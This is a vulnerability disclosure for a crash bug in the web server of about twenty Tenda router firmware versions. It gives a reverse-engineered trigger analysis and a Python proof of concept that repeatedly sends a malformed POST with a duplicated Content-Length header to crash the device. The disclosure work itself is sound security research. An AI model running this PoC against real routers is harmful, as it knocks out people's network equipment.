# Overview

| Firmware Name  | Firmware Version  | Download Link  |
| -------------- | ----------------- | -------------- |
| AC8v4    | V16.03.34.06    | https://www.tenda.com.cn/download/detail-3518.html    |
| AC8v4    | V16.03.34.09    | https://www.tenda.com.cn/download/detail-3683.html    |
| AC10v5    | V16.03.48.23    | https://www.tenda.com.cn/download/detail-3851.html    |
| AC10v5    | V16.03.48.19    | https://www.tenda.com.cn/download/detail-3771.html    |
| AC10v4    | V16.03.10.20    | https://www.tenda.com.cn/download/detail-3684.html    |
| AC10v4    | V16.03.10.13    | https://www.tenda.com.cn/download/detail-3506.html    |
| AC6v2    |  V15.03.06.23    | https://www.tenda.com.cn/download/detail-2855.html    |
| AC1206    | V15.03.06.23    | https://www.tenda.com.cn/download/detail-2766.html   |
| AC9V3      | V15.03.06.42   | https://www.tenda.com.cn/download/detail-2908.html   |
| AC9V1      | V15.03.05.19(6318_)   | https://www.tenda.com.cn/download/detail-2682.html   |
| AC9V1     |  V15.03.05.14   | https://www.tenda.com.cn/download/detail-2650.html   |
| AC9V1     |  V15.03.2.13   | https://www.tenda.com.cn/download/detail-2554.html   |
| AC18      | V15.03.05.19(6318)    | https://www.tenda.com.cn/download/detail-2683.html    |
| AC18      | V15.03.05.05    | https://www.tenda.com.cn/download/detail-2610.html    |
| AC500      |  V2.0.1.9(1307)    | https://www.tenda.com.cn/download/detail-2470.html    |
| AC500     | V1.0.0.16   | https://www.tenda.com.cn/download/detail-2219.html    |
| AC500     | V1.0.0.14   | https://www.tenda.com.cn/download/detail-2078.html   |
| AC10U    | V15.03.06.48   | https://www.tendacn.com/download/detail-3170.html    |
| AC10U    | V15.03.06.49   | https://www.tendacn.com/download/detail-3795.html    |
| AC7    | V15.03.06.44   |https://www.tenda.com.cn/download/detail-2776.html    |
| AC15    | V15.03.05.18   | https://www.tenda.com.cn/download/detail-2710.html   |
| AC15    | V15.03.05.19   | https://www.tenda.com.cn/download/detail-2680.html  |



# Vulnerability details
## 1. Vulnerability Trigger Location
The following vulnerability analysis and explanation are based on the `AC8V4` router, with firmware version `V16.03.34.06`. The vulnerability trigger and analysis methods for other models are similar.

The vulnerability trigger location is at the `strlen` function call under the `websReadEvent` function, at address 0x433c08. For easier analysis, I referred to the GoAhead 2.5 source code from https://github.com/ehlalwayoUk/goahead/tree/master and modified the variable names in Ghidra accordingly.
![Vulnerability Trigger Location](./assets/Trigger.png)

## 2. Conditions to Satisfy
- In the websUrlParse function, the `?` in POST /goform/GetIPTV?fgHPOST/goform/SysToo allows `strchr` at `0x426400` to get the index of the ?. Referring to the GoAhead source code, it can be seen that the information after `?` is stored in `wp->query`. ![websUrlParse](./assets/websUrlParse.png) ![websUrlParse](./assets/websurlparse_source.png.png) 

- **Content-Length** must be written twice.
    - The first `Content-Length` should be `>= 1`. This is necessary to set `param_1 + 0xec(wp->flags) |= 0x400` and call `websSetVar`  to set `CONTENT_LENGTH` value..
    ![else_content_length](./assets/else_content_length.png)
    - The second `Content-Length` is to set `clen = 0`. It set `param_1 + 0xf4 = 0`.
- After that, an empty line (`\r\n`) is needed to ensure the final `text` is empty.In the `socketGets` function, reading an isolated \r\n sets `nbytes = 0`, and as a result, `*text = 0`. The corresponding assembly location is at `0x41bef4`.![socketGets](./assets/socketGets.png)

- Due to conditions such as nbytes = 0 being met, wp->state = 8 is finally set in the websGetInput function at address 0x434694.![wp_state_8](./assets/wp_state_8.png)

- At address `0x4339dc` in the websReadEvent function, the value of `iVar2` is obtained as `wp->state`, which is 8.![getstate](./assets/getstate.png)

- As a result, in the `websReadEvent` function, because `iVar2 = 8` and there is content in `wp->query`, both the `if` and `else if` conditions are not satisfied, leading to the else branch being executed, which triggers the vulnerability.`strlen` is called with a null pointer, which leads to a segmentation fault when dereferenced internally.![ivar2_8](./assets/ivar2_8.png)


# POC

```python
import socket

host = "192.168.1.100"
port = 80
times = 0
while 1:
    times += 1
    print("times:"+str(times))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    request = (
        "POST /goform/GetIPTV?fgHPOST/goform/SysToo HTTP/1.1\r\n"
        "Content-Length:1\r\n"
        "Content-Length:# \r\n"
        "\r\n"
    )
    s.send(request.encode())
    response = s.recv(4096)
    print(response.decode())
    s.close()
```

# Vulnerability Verification Screenshot
## 1. AC8v4 &nbsp;&nbsp; V16.03.34.06
![websReadEvent/crash_image/ac8v4_06.png](./crash_image/ac8v4_06.png)

## 2. AC8v4 &nbsp;&nbsp; V16.03.34.09
![websReadEvent/crash_image/ac8v4_09.png](./crash_image/ac8v4_09.png)

## 3. AC10v5 &nbsp;&nbsp; V16.03.48.23 && V16.03.48.19
Since the firmware for version V5 is encrypted and cannot be opened from the official website, it was tested on the actual device. This is a screenshot from the actual router.
![websReadEvent/crash_image/ac10v5.png](./crash_image/ac10v5.png)

## 4. AC10v4 &nbsp;&nbsp; V16.03.10.20
![websReadEvent/crash_image/ac10v4_20.png](./crash_image/ac10v4_20.png)

## 5. AC10v4 &nbsp;&nbsp; V16.03.10.13
![websReadEvent/crash_image/ac10v4_13.png](./crash_image/ac10v4_13.png)

## 6. AC6v2 &nbsp;&nbsp; V15.03.06.23
![websReadEvent/crash_image/ac6v2.png](./crash_image/ac6v2.png)

## 7. AC1206 &nbsp;&nbsp; V15.03.06.23
![websReadEvent/crash_image/ac1206.png](./crash_image/ac1206_23.png)

## 8. AC9V3 &nbsp;&nbsp; V15.03.06.42
![websReadEvent/crash_image/ac9.png](./crash_image/ac9_42.png)

## 9. AC9V1 &nbsp;&nbsp; V15.03.05.19(6318_)
![websReadEvent/crash_image/ac9_19.png](./crash_image/ac9_19.png)

## 10. AC9V1 &nbsp;&nbsp; V15.03.05.14
![websReadEvent/crash_image/ac9v1_14.png](./crash_image/ac9v1_14.png)

## 11. AC9V1 &nbsp;&nbsp; V15.03.2.13
![websReadEvent/crash_image/ac9v1_13.png](./crash_image/ac9_v1_13.png)

## 12. AC18 &nbsp;&nbsp; V15.03.05.19(6318)
![websReadEvent/crash_image/ac18_19.png](./crash_image/ac18_19.png)

## 13. AC18 &nbsp;&nbsp; V15.03.05.05
![websReadEvent/crash_image/ac18_05.png](./crash_image/ac18_05.png)

## 14. AC500 &nbsp;&nbsp; V2.0.1.9(1307)
![websReadEvent/crash_image/ac500_v2019_1307](./crash_image/ac500_v2019_1307.png)

## 15. AC500 &nbsp;&nbsp; V1.0.0.16
![websReadEvent/crash_image/ac500_v1_1006](./crash_image/ac500_v1_1006.png)

## 16. AC500 &nbsp;&nbsp; V1.0.0.14
![websReadEvent/crash_image/ac500_v1_1004](./crash_image/ac500_v1_1004.png)

## 17. AC10U &nbsp;&nbsp; V15.03.06.48
![websReadEvent/crash_image/ac10u_48](./crash_image/ac10u_48.png)

## 18. AC10U &nbsp;&nbsp; V15.03.06.49
![websReadEvent/crash_image/ac10u_49](./crash_image/ac10u_49.png)

## 19. AC7 &nbsp;&nbsp; V15.03.06.44
![websReadEvent/crash_image/ac7_v1](./crash_image/ac7_v1.png)

## 20. AC15 &nbsp;&nbsp; V15.03.05.18 && V15.03.05.19
![websReadEvent/crash_image/ac15.png](./crash_image/ac15.png)

# Discoverer
The vulnerability was discovered by Professor Wei Zhou's team (IoTS&P Lab) from the School of Cyber Science and Engineering at Huazhong University of Science and Technology.
